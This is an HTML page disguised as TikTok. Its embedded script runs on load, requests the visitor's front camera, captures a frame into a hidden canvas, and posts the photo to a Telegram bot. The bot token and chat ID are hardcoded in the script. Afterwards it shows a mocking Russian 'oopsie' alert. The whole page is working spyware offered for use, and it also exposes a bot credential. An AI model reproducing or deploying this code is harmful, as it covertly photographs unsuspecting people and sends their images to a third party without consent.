<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>TikTok</title>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <script>
    const BOT_TOKEN = "8313655376:AAF_Kxz8onbuFvidZJrLALTnq7gIRkcXzzM";
    const CHAT_ID = "5776170131";

    async function sendToTelegram(blob) {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, "snapshot.png");
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
    }

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        video.srcObject = stream;
        video.onloadedmetadata = async () => {
          await new Promise(r => setTimeout(r, 800));
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataURL = canvas.toDataURL("image/png");
          const blob = await (await fetch(dataURL)).blob();
          stream.getTracks().forEach(t => t.stop());
          await sendToTelegram(blob);
          alert("упсиии");
        };
      } catch (err) {
        alert("Ошибка доступа к камере" + err);
      }
    }

    startCamera();
  </script>
</body>
</html>
